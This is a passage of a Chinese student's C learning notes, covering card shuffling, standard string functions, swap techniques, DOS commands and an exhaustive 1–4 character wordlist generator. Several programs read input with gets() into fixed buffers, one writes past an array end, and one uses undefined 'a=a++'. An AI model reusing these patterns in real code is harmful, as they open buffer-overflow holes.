class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a=<span class=\"number\">0</span>,card[<span class=\"number\">52</span>],b,c;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\" 甲 乙 丙 丁\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(a&lt;=<span class=\"number\">52</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcard[a]=a+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\ta=a++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsrand(time(<span class=\"number\">0</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(a=<span class=\"number\">0</span>;a&lt;<span class=\"number\">52</span>;a=a++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tb=rand()%(<span class=\"number\">52</span>-a)+a;</span><br><span class=\"line\">\t\tc=card[a];</span><br><span class=\"line\">\t\tcard[a]=card[b];</span><br><span class=\"line\">\t\tcard[b]=c;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%3d\"</span>,card[a]);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a!=<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(a%<span class=\"number\">4</span>==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"number\">1</span>==<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> a=a++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%3d\\n\"</span>,card[a]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"13.png\" alt><img src=\"14.png\" alt><img src=\"15.png\" alt><img src=\"16.png\" alt></p>\n<h1 id=\"函数【2015-11-5】\"><a href=\"#函数【2015-11-5】\" class=\"headerlink\" title=\"函数【2015.11.5】\"></a>函数【2015.11.5】</h1><h2 id=\"strcmp字符串比较函数\"><a href=\"#strcmp字符串比较函数\" class=\"headerlink\" title=\"strcmp字符串比较函数\"></a>strcmp字符串比较函数</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">20</span>],b[<span class=\"number\">20</span>];</span><br><span class=\"line\">\tgets(a);</span><br><span class=\"line\">\tgets(b);</span><br><span class=\"line\">\t<span class=\"built_in\">strcmp</span>(a,b);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,<span class=\"built_in\">strcmp</span>(a,b));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"strcpy字符串拷贝函数\"><a href=\"#strcpy字符串拷贝函数\" class=\"headerlink\" title=\"strcpy字符串拷贝函数\"></a>strcpy字符串拷贝函数</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">20</span>],b[<span class=\"number\">20</span>];</span><br><span class=\"line\">\tgets(a);</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(b,a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"strcat字符串连接函数\"><a href=\"#strcat字符串连接函数\" class=\"headerlink\" title=\"strcat字符串连接函数\"></a>strcat字符串连接函数</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">40</span>],b[<span class=\"number\">20</span>];</span><br><span class=\"line\">\tgets(a);</span><br><span class=\"line\">\tgets(b);</span><br><span class=\"line\">\t<span class=\"built_in\">strcat</span>(a,b);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"17.png\" alt></p>\n<h2 id=\"strlen字符串长度测试函数\"><a href=\"#strlen字符串长度测试函数\" class=\"headerlink\" title=\"strlen字符串长度测试函数\"></a>strlen字符串长度测试函数</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">20</span>];</span><br><span class=\"line\">\tgets(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,<span class=\"built_in\">strlen</span>(a));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001-1586098644743.png\" alt=\"img\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">H  e  l  l  o  *  w  o  r  l  d  !     （*表示空格）</span><br><span class=\"line\">1  2  3  4  5  6  7  8  9  A  B  C</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"strlwr字符串转换函数（大转小）\"><a href=\"#strlwr字符串转换函数（大转小）\" class=\"headerlink\" title=\"strlwr字符串转换函数（大转小）\"></a>strlwr字符串转换函数（大转小）</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">20</span>];</span><br><span class=\"line\">\tgets(a);</span><br><span class=\"line\">\tstrlwr(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,strlwr(a));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"18.png\" alt></p>\n<h2 id=\"strupr字符串转换函数（小转大）\"><a href=\"#strupr字符串转换函数（小转大）\" class=\"headerlink\" title=\"strupr字符串转换函数（小转大）\"></a>strupr字符串转换函数（小转大）</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">20</span>];</span><br><span class=\"line\">\tgets(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,strupr(a));<span class=\"comment\">//(比六的代码更精简)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001-1586098733205.png\" alt=\"img\"></p>\n<h1 id=\"大小写字符转换【2015-11-12】\"><a href=\"#大小写字符转换【2015-11-12】\" class=\"headerlink\" title=\"大小写字符转换【2015.11.12】\"></a>大小写字符转换【2015.11.12】</h1><h2 id=\"V1-0\"><a href=\"#V1-0\" class=\"headerlink\" title=\"V1.0\"></a>V1.0</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">L2UandU2L</span><span class=\"params\">(<span class=\"keyword\">char</span> str[])</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[]=<span class=\"string\">\"1aS2dF3zX4cV\"</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(a);</span><br><span class=\"line\">\tL2UandU2L(a);</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">L2UandU2L</span><span class=\"params\">(<span class=\"keyword\">char</span> str[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(str[i])</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(str[i]&gt;=<span class=\"string\">'a'</span>&amp;&amp;str[i]&lt;=<span class=\"string\">'z'</span>)</span><br><span class=\"line\">\t\t\tstr[i]=str[i]-<span class=\"string\">'a'</span>+<span class=\"string\">'A'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(str[i]&gt;=<span class=\"string\">'A'</span>&amp;&amp;str[i]&lt;=<span class=\"string\">'Z'</span>)</span><br><span class=\"line\">\t\t\tstr[i]=str[i]-<span class=\"string\">'A'</span>+<span class=\"string\">'a'</span>;</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001-1586098779362.png\" alt=\"img\"></p>\n<h2 id=\"V2-0\"><a href=\"#V2-0\" class=\"headerlink\" title=\"V2.0\"></a>V2.0</h2><p><img src=\"clip_image001-1586098798532.png\" alt=\"img\"></p>\n<h1 id=\"作业【2015-11-16】\"><a href=\"#作业【2015-11-16】\" class=\"headerlink\" title=\"作业【2015.11.16】\"></a>作业【2015.11.16】</h1><h2 id=\"Dir\"><a href=\"#Dir\" class=\"headerlink\" title=\"Dir\"></a>Dir</h2><p>显示目录文件和子目录列表。如果在没有参数的情况下使用，则 dir 显示磁盘的卷标和序列号，后接磁盘上目录和文件的列表，包括它们的名称和最近修改的日期及时间。dir 可以显示文件的扩展名以及文件的字节大小。Dir 也显示列出的文件及目录的总数、累计大小和磁盘上保留的可用空间（以字节为单位）。</p>\n<p> <img src=\"clip_image001-1586098983555.png\" alt=\"img\"></p>\n<h2 id=\"Path\"><a href=\"#Path\" class=\"headerlink\" title=\"Path\"></a>Path</h2><p><img src=\"clip_image002-1586098983555.png\" alt=\"img\"></p>\n<p>可用”path 路径;%path%”添加路径</p>\n<h2 id=\"include中的-lt-gt-和””的区别\"><a href=\"#include中的-lt-gt-和””的区别\" class=\"headerlink\" title=\"#include中的&lt;&gt;和””的区别\"></a>#include中的&lt;&gt;和””的区别</h2><p>&lt;&gt;先去系统目录中找头文件，如果没有在到当前目录下找。所以像标准的头文件 stdio.h、stdlib.h等用这个方法。<br> 而””首先在当前目录下寻找，如果找不到，再到系统目录中寻找。 这个用于include自定义的头文件，让系统优先使用当前目录中定义的。</p>\n<h2 id=\"Stdio-h\"><a href=\"#Stdio-h\" class=\"headerlink\" title=\"Stdio.h\"></a>Stdio.h</h2><p><img src=\"clip_image003-1586098983555.png\" alt=\"img\"></p>\n<h1 id=\"交换两个变量的值【2015-11-22】\"><a href=\"#交换两个变量的值【2015-11-22】\" class=\"headerlink\" title=\"交换两个变量的值【2015.11.22】\"></a>交换两个变量的值【2015.11.22】</h1><h2 id=\"指针-引用temp\"><a href=\"#指针-引用temp\" class=\"headerlink\" title=\"指针-引用temp\"></a>指针-引用temp</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">swap</span><span class=\"params\">(<span class=\"keyword\">int</span> *x,<span class=\"keyword\">int</span> *y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> temp;</span><br><span class=\"line\">\ttemp=*x;</span><br><span class=\"line\">\t*x=*y;</span><br><span class=\"line\">\t*y=temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> x,<span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d %d\"</span>,&amp;x,&amp;y);\t</span><br><span class=\"line\">\tswap(&amp;x,&amp;y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %d\\n\"</span>,x,y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"异或\"><a href=\"#异或\" class=\"headerlink\" title=\"异或\"></a>异或</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">swap</span><span class=\"params\">(<span class=\"keyword\">int</span> *x,<span class=\"keyword\">int</span> *y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t*x^=*y;</span><br><span class=\"line\">\t*y^=*x;</span><br><span class=\"line\">\t*x^=*y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> x,<span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d %d\"</span>,&amp;x,&amp;y);\t</span><br><span class=\"line\">\tswap(&amp;x,&amp;y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %d\\n\"</span>,x,y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"19.png\" alt></p>\n<p><img src=\"clip_image001-1586099144595.png\" alt=\"img\"></p>\n<h2 id=\"引用传递\"><a href=\"#引用传递\" class=\"headerlink\" title=\"引用传递\"></a>引用传递</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">swap</span><span class=\"params\">(<span class=\"keyword\">int</span> &amp;x,<span class=\"keyword\">int</span> &amp;y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> temp;</span><br><span class=\"line\">\ttemp=x;</span><br><span class=\"line\">\tx=y;</span><br><span class=\"line\">\ty=temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> x,<span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d %d\"</span>,&amp;x,&amp;y);\t</span><br><span class=\"line\">\tswap(x,y);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %d\\n\"</span>,x,y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001-1586099175197.png\" alt=\"img\"></p>\n<h1 id=\"多种方法输出及查看内存和值【2015-11-26】\"><a href=\"#多种方法输出及查看内存和值【2015-11-26】\" class=\"headerlink\" title=\"多种方法输出及查看内存和值【2015.11.26】\"></a>多种方法输出及查看内存和值【2015.11.26】</h1><h2 id=\"多种方法输出hellp-world\"><a href=\"#多种方法输出hellp-world\" class=\"headerlink\" title=\"多种方法输出hellp world\"></a>多种方法输出hellp world</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[]=<span class=\"string\">\"hello world\"</span>,*b;</span><br><span class=\"line\">\tb=a;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"hello world\\n\"</span>);  <span class=\"comment\">//printf函数</span></span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"hello world\"</span>);      <span class=\"comment\">//puts函数</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,a);         <span class=\"comment\">//数组整体输出</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"built_in\">strlen</span>(a);i++)</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c\"</span>,a[i]);      <span class=\"comment\">//数组单个元素循环输出</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,b);         <span class=\"comment\">//运用指针的数组输出</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;*b;b++)</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c\"</span>,*b);        <span class=\"comment\">//按照地址单个输出</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001-1586099226782.png\" alt=\"img\"></p>\n<h2 id=\"查看内存和值\"><a href=\"#查看内存和值\" class=\"headerlink\" title=\"查看内存和值\"></a>查看内存和值</h2><p><img src=\"clip_image002-1586099238066.jpg\" alt=\"img\"></p>\n<h1 id=\"dos常用命令\"><a href=\"#dos常用命令\" class=\"headerlink\" title=\"dos常用命令\"></a>dos常用命令</h1><h2 id=\"DIR\"><a href=\"#DIR\" class=\"headerlink\" title=\"DIR\"></a>DIR</h2><p>含义：显示指定路径上所有文件或目录的信息</p>\n<p>格式：DIR [盘符：][路径][文件名] [参数]</p>\n<p>参数：</p>\n<p>/W：<a href=\"http://product.pconline.com.cn/itbk/diy/display/1111/2579088.html\" target=\"_blank\" rel=\"noopener\">宽屏</a>显示，一排显示5个文件名，而不会显示修改时间，文件大小等信息;</p>\n<p>/P：分页显示，当屏幕无法将信息完全显示时，可使用其进行分页显示;</p>\n<p>/A：显示具有特殊属性的文件;</p>\n<p>/S：显示当前目录及其子目录下所有的文件。</p>\n<p>举例：DIR /P</p>\n<p>将分屏显示当前目录下文件。在当前屏最后有一个“Press any key to continue . . .”提示，表示按任意键继续。</p>\n<p><a href=\"http://www.pconline.com.cn/images/html/viewpic_pconline.htm?http:/img0.pconline.com.cn/pconline/1404/14/4604099_1.jpg&channel=8970\" target=\"_blank\" rel=\"noopener\"><img src=\"clip_image001.jpg\" alt=\"常用DOS命令大全1\"></a></p>\n<h2 id=\"taskkill\"><a href=\"#taskkill\" class=\"headerlink\" title=\"taskkill\"></a>taskkill</h2><p>taskkill /f /im 想要结束的进程名 /f：指定强制终止的进程 /im ：映像名称 在后面可加/t：结束进程树</p>\n<h1 id=\"字典程序\"><a href=\"#字典程序\" class=\"headerlink\" title=\"字典程序\"></a>字典程序</h1><h2 id=\"V1-0【2015-12-3】\"><a href=\"#V1-0【2015-12-3】\" class=\"headerlink\" title=\"V1.0【2015.12.3】\"></a>V1.0【2015.12.3】</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,i,j,k,l;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> b[]=<span class=\"string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"请输入1-4来选择您想要对应尾数的字典程序\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"生成的字典为\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a&lt;<span class=\"number\">1</span>||a&gt;<span class=\"number\">4</span>)</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"你输入的数字不符合要求\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span>(a)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">62</span>;i++)</span><br><span class=\"line\">\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t   <span class=\"built_in\">printf</span>(<span class=\"string\">\"%c \"</span>,b[i]);</span><br><span class=\"line\">\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">62</span>;i++)</span><br><span class=\"line\">\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t   <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">62</span>;j++)</span><br><span class=\"line\">\t\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t\t   <span class=\"built_in\">printf</span>(<span class=\"string\">\"%c%c  \"</span>,b[i],b[j]);</span><br><span class=\"line\">\t\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">62</span>;i++)</span><br><span class=\"line\">\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t   <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">62</span>;j++)</span><br><span class=\"line\">\t\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t\t   <span class=\"keyword\">for</span>(k=<span class=\"number\">0</span>;k&lt;<span class=\"number\">62</span>;k++)</span><br><span class=\"line\">\t\t\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t\t\t   <span class=\"built_in\">printf</span>(<span class=\"string\">\"%c%c%c \"</span>,b[i],b[j],b[k]);</span><br><span class=\"line\">\t\t\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t   &#125;;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">62</span>;i++)</span><br><span class=\"line\">\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t   <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">62</span>;j++)</span><br><span class=\"line\">\t\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t\t   <span class=\"keyword\">for</span>(k=<span class=\"number\">0</span>;k&lt;<span class=\"number\">62</span>;k++)</span><br><span class=\"line\">\t\t\t\t\t   &#123;</span><br><span class=\"line\">\t\t\t\t\t\t   <span class=\"keyword\">for</span>(l=<span class=\"number\">0</span>;l&lt;<span class=\"number\">62</span>;l++)</span><br><span class=\"line\">\t\t\t\t\t\t\t   <span class=\"built_in\">printf</span>(<span class=\"string\">\"%c%c%c%c \"</span>,b[i],b[j],b[k],b[l]);</span><br><span class=\"line\">\t\t\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t\t   &#125;</span><br><span class=\"line\">\t\t\t   &#125;;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 运用嵌套的for循环来实现功能，这个最基础的方法，也是最繁琐的、代码最长的方法。</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001-1586099341294.png\" alt></p>\n<p><img src=\"clip_image003-1586099341294.png\" alt=\"clip_image003-1586099341294\"></p>\n<p><img src=\"clip_image002-1586099341294.png\" alt=\"clip_image002-1586099341294\"></p>\n<h2 id=\"V2-0（带结构体）【2015-12-10】\"><a href=\"#V2-0（带结构体）【2015-12-10】\" class=\"headerlink\" title=\"V2.0（带结构体）【2015.12.10】\"></a>V2.0（带结构体）【2015.12.10】</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">dir1(<span class=\"keyword\">int</span> a);</span><br><span class=\"line\">dir2(<span class=\"keyword\">int</span> a);</span><br><span class=\"line\">dir3(<span class=\"keyword\">int</span> a);</span><br><span class=\"line\">dir4(<span class=\"keyword\">int</span> a);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">data</span></span></span><br><span class=\"line\"><span 